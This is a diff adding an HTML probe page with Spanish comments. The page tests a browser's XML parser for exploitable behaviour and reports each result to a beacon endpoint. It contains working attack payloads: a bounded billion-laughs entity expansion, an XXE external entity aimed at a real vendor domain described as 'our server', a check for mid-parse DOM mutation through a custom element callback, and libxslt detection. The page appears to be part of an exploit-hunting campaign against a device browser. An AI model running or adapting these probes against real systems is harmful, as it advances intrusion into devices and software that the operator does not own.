@@ -1,0 +1,99 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<script src="runtime-derive/derive-runtime.js"></script>
+<script>(function(){try{var x=new XMLHttpRequest();x.open("GET","current.txt",false);x.send(null);var u=(x.responseText||"").trim();if(u&&location.href.indexOf(u.split("?")[0])===-1){location.replace(u);}}catch(e){}})();</script>
+<title>FA-v39-xml — press-29: la ventana del XML parser (DOMParser/XSLT/XXE/CER-en-XML)</title></head>
+<body><pre id="out">FA-v39-xml…</pre>
+<script>
+(function(){
+"use strict";
+/* FA-v39-xml — press-29: la ventana análoga del XMLDocumentParser
+ * (declarada sin auditar por G53-DOM). 0-crash por construcción.
+ * S1: inventario (DOMParser/XSLTProcessor/responseXML)
+ * S2: expansión de entidades INTERNAS (billion-laughs-lite acotado)
+ * S3: custom element DENTRO de XHTML parseándose — ¿connectedCallback
+ *     corre DURANTE el parseo XML? (la ventana análoga al CER-WRITE)
+ *     y si sí: ¿podemos MUTAR el doc a mitad?
+ * S4: XXE — entidad EXTERNA apuntando a NUESTRO servidor: si el parser
+ *     la busca, el GET aparece en el wire (firma de red, no de JS)
+ * S5: XSLTProcessor — transformación (libxslt = otra librería C entera)
+ * Máxima telemetría. */
+var RID="v39x"+Date.now().toString(36).slice(-13);
+var out=document.getElementById("out");
+function say(s){try{out.appendChild(document.createTextNode("\n"+s));}catch(e){}}
+function bk(s,b){try{fetch("/beacon/V39-"+s,{method:"POST",cache:"no-store",keepalive:true,headers:{"Content-Type":"application/json"},body:JSON.stringify({r:RID,b:String(b).slice(0,500)})}).catch(function(){});}catch(e){}}
+var HB=setInterval(function(){bk("HB","main-hb");},2000);
+
+var dr="-",rt="-";
+try{ dr=typeof window.deriveRuntime; rt=(dr==="object"&&window.deriveRuntime)?typeof window.deriveRuntime.run:"-"; }catch(e){}
+bk("L","v39-xml; dr="+dr+"; rt="+rt+"; DP="+(typeof DOMParser)+"; XSLT="+(typeof XSLTProcessor));
+
+/* S2 — expansión de entidades internas (acotada: ~390KB si expande) */
+(function(){
+  var m="-",e1="";
+  var xml='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "0123456789"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"><!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;"><!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">]><r>&e;</r>';
+  try{
+    var doc=new DOMParser().parseFromString(xml,"application/xml");
+    var err=doc.querySelector("parsererror");
+    if(err){ m="parsererror:"+String(err.textContent).slice(0,60); }
+    else{
+      var txt=doc.documentElement?doc.documentElement.textContent:"";
+      m="ok;outLen="+txt.length+" (100000=expansión COMPLETA; menor=recortada; 0=sin expandir)";
+    }
+  }catch(e){ e1=String((e&&e.message)||e).slice(0,50); }
+  bk("S2",m+";e="+e1);
+})();
+
+/* S3 — custom element en XHTML parseándose: ¿reacción DURANTE parseo XML? */
+(function(){
+  var fired="-", mutated="-", e1="";
+  try{
+    customElements.define("fa-xml", class extends HTMLElement{
+      connectedCallback(){
+        fired="DURANTE-PARSEO";
+        bk("S3X","connectedCallback disparó — la ventana XML EXISTE");
+        /* ¿podemos mutar el doc a mitad del parseo? */
+        try{ var b=this.ownerDocument.createElement("x-mut"); this.appendChild(b); mutated="mut-ok"; }
+        catch(e2){ mutated="mut-E:"+String((e2&&e2.message)||e2).slice(0,30); }
+      }
+    });
+    var xml='<r xmlns="http://www.w3.org/1999/xhtml"><fa-xml></fa-xml><after>1</after></r>';
+    var doc=new DOMParser().parseFromString(xml,"application/xhtml+xml");
+    var err=doc.querySelector("parsererror");
+    bk("S3","fired="+fired+";mutated="+mutated+";perr="+(err?"si":"no")+";e="+e1);
+  }catch(e){ bk("S3","E:"+String((e&&e.message)||e).slice(0,50)); }
+})();
+
+/* S4 — XXE: entidad EXTERNA → ¿el parser pide a nuestro servidor? */
+(function(){
+  var m="-",e1="";
+  var xml='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "https://manuals.playstation.net/document/al/ps5/xxe-canary.txt">]><r>&xxe;</r>';
+  try{
+    var doc=new DOMParser().parseFromString(xml,"application/xml");
+    var err=doc.querySelector("parsererror");
+    var txt=(!err&&doc.documentElement)?doc.documentElement.textContent:"";
+    m="outLen="+txt.length+";perr="+(err?"si":"no")+" (si el servidor ve GET xxe-canary.txt = XXE VIVO — checar wire)";
+  }catch(e){ e1=String((e&&e.message)||e).slice(0,50); }
+  bk("S4",m+";e="+e1);
+})();
+
+/* S5 — XSLTProcessor: transformación simple (libxslt) */
+(function(){
+  var m="-",e1="";
+  try{
+    if(typeof XSLTProcessor!=="function"){ bk("S5","SKIP no-XSLT"); return; }
+    var xml='<r><n a="7"/></r>';
+    var xsl='<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/">OUT:<xsl:value-of select="/r/n/@a"/></xsl:template></xsl:stylesheet>';
+    var dp=new DOMParser();
+    var doc=dp.parseFromString(xml,"application/xml");
+    var xsldoc=dp.parseFromString(xsl,"application/xml");
+    var xp=new XSLTProcessor();
+    xp.importStylesheet(xsldoc);
+    var res=xp.transformToFragment(doc,document);
+    m="ok;txt="+(res?String(res.textContent).slice(0,30):"null");
+  }catch(e){ e1=String((e&&e.message)||e).slice(0,50); }
+  bk("S5",m+";e="+e1+" (ok=libxslt VIVO en este build)");
+})();
+
+setTimeout(function(){ clearInterval(HB); bk("Z","FA-v39-xml complete"); },2000);
+})();
+</script></body></html>
